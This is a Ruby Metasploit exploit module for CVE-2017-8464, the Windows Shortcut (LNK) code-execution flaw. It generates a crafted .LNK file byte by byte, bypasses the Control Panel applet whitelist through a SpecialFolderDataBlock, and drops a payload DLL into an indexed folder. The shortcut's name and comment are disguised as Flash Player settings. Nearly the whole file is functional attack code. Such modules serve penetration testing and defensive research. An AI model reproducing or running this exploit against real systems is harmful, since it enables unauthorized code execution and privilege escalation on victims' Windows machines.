# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Post::File
  include Msf::Post::Windows::Priv

  attr_accessor :exploit_dll_name

  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039;            => &#039;LNK Code Execution Vulnerability&#039;,
        &#039;Description&#039;     => %q{
          This module exploits a vulnerability in the handling of Windows Shortcut files (.LNK)
          that contain a dynamic icon, loaded from a malicious DLL.

          This vulnerability is a variant of MS15-020 (CVE-2015-0096). The created LNK file is
          similar except an additional SpecialFolderDataBlock is included. The folder ID set
          in this SpecialFolderDataBlock is set to the Control Panel. This is enough to bypass
          the CPL whitelist. This bypass can be used to trick Windows into loading an arbitrary
          DLL file.

          The PATH option must be an absolute path to a writeable directory which is indexed for
          searching. If no PATH is specified, the module defaults to %USERPROFILE%.
        },
        &#039;Author&#039;          =>
          [
            &#039;Uncredited&#039;,      # vulnerability discovery
            &#039;Yorick Koster&#039;,   # msf module
            &#039;Spencer McIntyre&#039; # msf module
          ],
        &#039;License&#039;         => MSF_LICENSE,
        &#039;References&#039;      =>
          [
            [&#039;CVE&#039;, &#039;2017-8464&#039;],
            [&#039;URL&#039;, &#039;https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8464&#039;],
            [&#039;URL&#039;, &#039;http://www.vxjump.net/files/vuln_analysis/cve-2017-8464.txt&#039;], # writeup
            [&#039;URL&#039;, &#039;https://msdn.microsoft.com/en-us/library/dd871305.aspx&#039;], # [MS-SHLLINK]: Shell Link (.LNK) Binary File Format
            [&#039;URL&#039;, &#039;http://www.geoffchappell.com/notes/security/stuxnet/ctrlfldr.htm&#039;],
            [&#039;URL&#039;, &#039;https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf&#039;]
          ],
        &#039;DefaultOptions&#039;  =>
          {
            &#039;EXITFUNC&#039;         => &#039;process&#039;,
            &#039;FileDropperDelay&#039; => 15,
            &#039;WfsDelay&#039;         => 30
          },
        &#039;Arch&#039;            => [ARCH_X86, ARCH_X64],
        &#039;Payload&#039;         =>
          {
            &#039;Space&#039;       => 2048
          },
        &#039;Platform&#039;        => &#039;win&#039;,
        &#039;Targets&#039;         =>
          [
            [ &#039;Windows x64&#039;, { &#039;Arch&#039; => ARCH_X64 } ],
            [ &#039;Windows x86&#039;, { &#039;Arch&#039; => ARCH_X86 } ]
          ],
        &#039;DefaultTarget&#039;   => 0, # Default target is Automatic
        &#039;DisclosureDate&#039;  => &#039;Jun 13 2017&#039;
      )
    )

    register_options(
      [
        OptString.new(&#039;FILENAME&#039;, [false, &#039;The LNK file&#039;]),
        OptString.new(&#039;DLLNAME&#039;, [false, &#039;The DLL file containing the payload&#039;]),
        OptString.new(&#039;PATH&#039;, [false, &#039;An explicit path to where the files should be written to&#039;])
      ]
    )

    register_advanced_options(
      [
        OptString.new(&#039;LnkComment&#039;, [true, &#039;The comment to use in the generated LNK file&#039;, &#039;Manage Flash Player Settings&#039;]),
        OptString.new(&#039;LnkDisplayName&#039;, [true, &#039;The display name to use in the generated LNK file&#039;, &#039;Flash Player&#039;])
      ]
    )
  end

  def check
    if session.sys.process[&#039;SearchIndexer.exe&#039;]
      return Exploit::CheckCode::Detected
    end

    Exploit::CheckCode::Safe
  end

  def get_name(option, default_ext)
    name = datastore[option].to_s.strip
    name = "#{rand_text_alpha(16)}.#{default_ext}" if name.blank?
    name
  end

  def exploit
    if is_system?
      fail_with(Failure::None, &#039;Session is already elevated&#039;)
    end

    if session.platform != &#039;windows&#039;
    end

    if check == Exploit::CheckCode::Safe
      fail_with(Failure::NotVulnerable, &#039;Exploit not available on this system.&#039;)
    end

    if sysinfo[&#039;Architecture&#039;] == ARCH_X64 && target.arch.first == ARCH_X86
      fail_with(Failure::NoTarget, &#039;Session host is x64, but the target is specified as x86&#039;)
    elsif sysinfo[&#039;Architecture&#039;] == ARCH_X86 && target.arch.first == ARCH_X64
      fail_with(Failure::NoTarget, &#039;Session host is x86, but the target is specified as x64&#039;)
    end

    path = ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;cve-2017-8464&#039;)
    arch = target[&#039;Arch&#039;] == ARCH_ANY ? payload.arch.first : target[&#039;Arch&#039;]
    datastore[&#039;EXE::Path&#039;] = path
    datastore[&#039;EXE::Template&#039;] = ::File.join(path, "template_#{arch}_windows.dll")

    path = datastore[&#039;PATH&#039;] || session.fs.file.expand_path("%USERPROFILE%")
    path.chomp!("\\")

    dll_path = "#{path}\\#{get_name(&#039;DLLNAME&#039;, &#039;dll&#039;)}"
    write_file(dll_path, generate_payload_dll)

    lnk_path = "#{path}\\#{get_name(&#039;FILENAME&#039;, &#039;lnk&#039;)}"
    write_file(lnk_path, generate_link(dll_path))
    register_files_for_cleanup(dll_path, lnk_path)
  end

  def file_rm(file)
    if file_dropper_delete(session, file) && @dropped_files && file_dropper_deleted?(session, file, true)
      @dropped_files.delete(file)
    end
  end

  def generate_link(path)
    vprint_status("Generating LNK file to load: #{path}")
    path += "\x00" # Do not use << here
    display_name = datastore[&#039;LnkDisplayName&#039;].dup << "\x00" # LNK Display Name
    comment = datastore[&#039;LnkComment&#039;].dup << "\x00"

    # Control Panel Applet ItemID with our DLL
    cpl_applet = [
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00
    ].pack(&#039;C*&#039;)
    cpl_applet << [path.length].pack(&#039;v&#039;)
    cpl_applet << [display_name.length].pack(&#039;v&#039;)
    cpl_applet << path.unpack(&#039;C*&#039;).pack(&#039;v*&#039;)
    cpl_applet << display_name.unpack(&#039;C*&#039;).pack(&#039;v*&#039;)
    cpl_applet << comment.unpack(&#039;C*&#039;).pack(&#039;v*&#039;)

    # LinkHeader
    ret = [
      0x4c, 0x00, 0x00, 0x00, # HeaderSize, must be 0x0000004C
      0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, # LinkCLSID, must be 00021401-0000-0000-C000-000000000046
      0x81, 0x00, 0x00, 0x00, # LinkFlags (HasLinkTargetIDList | IsUnicode)
      0x00, 0x00, 0x00, 0x00, # FileAttributes
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, # CreationTime
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, # AccessTime
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, # WriteTime
      0x00, 0x00, 0x00, 0x00, # FileSize
      0x00, 0x00, 0x00, 0x00, # IconIndex
      0x00, 0x00, 0x00, 0x00, # ShowCommand
      0x00, 0x00, # HotKey
      0x00, 0x00, # Reserved1
      0x00, 0x00, 0x00, 0x00, # Reserved2
      0x00, 0x00, 0x00, 0x00  # Reserved3
    ].pack(&#039;C*&#039;)

    # IDList
    idlist_data = &#039;&#039;
    # ItemID = ItemIDSize (2 bytes) + Data (variable)
    idlist_data << [0x12 + 2].pack(&#039;v&#039;)
    idlist_data << [
      # All Control Panel Items
      0x1f, 0x80, 0x20, 0x20, 0xec, 0x21, 0xea, 0x3a, 0x69, 0x10, 0xa2, 0xdd, 0x08, 0x00, 0x2b, 0x30,
      0x30, 0x9d
    ].pack(&#039;C*&#039;)
    # ItemID = ItemIDSize (2 bytes) + Data (variable)
    idlist_data << [cpl_applet.length + 2].pack(&#039;v&#039;)
    idlist_data << cpl_applet
    idlist_data << [0x00].pack(&#039;v&#039;) # TerminalID

    # LinkTargetIDList
    ret << [idlist_data.length].pack(&#039;v&#039;) # IDListSize
    ret << idlist_data

    # ExtraData
    # SpecialFolderDataBlock
    ret << [
      0x10, 0x00, 0x00, 0x00, # BlockSize
      0x05, 0x00, 0x00, 0xA0, # BlockSignature 0xA0000005
      0x03, 0x00, 0x00, 0x00, # SpecialFolderID (CSIDL_CONTROLS - My Computer\Control Panel)
      0x14, 0x00, 0x00, 0x00  # Offset in LinkTargetIDList
    ].pack(&#039;C*&#039;)
    # TerminalBlock
    ret << [0x00, 0x00, 0x00, 0x00].pack(&#039;V&#039;)
    ret
  end
end

